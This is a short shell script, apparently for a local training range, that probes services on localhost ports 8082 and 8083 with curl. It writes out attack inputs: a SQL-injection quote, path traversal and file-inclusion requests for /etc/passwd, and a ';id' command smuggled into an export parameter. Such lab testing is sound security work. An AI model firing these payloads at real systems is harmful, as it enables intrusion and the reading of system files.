#!/bin/sh
# Быстрая проверка сервисов полигона изнутри WSL.
echo "--- sqli ---"
curl -s -i --max-time 4 'http://127.0.0.1:8082/api/search?q=%27' | head -14
echo
echo "--- traversal ---"
curl -s --max-time 4 'http://127.0.0.1:8082/api/file?name=../../../../etc/passwd' | head -3
echo
echo "--- export ---"
curl -s --max-time 5 'http://127.0.0.1:8082/api/export?name=%3Bid' | head -6
echo
echo "--- php lfi ---"
curl -s --max-time 4 'http://127.0.0.1:8083/view?page=../../../../etc/passwd' | head -3
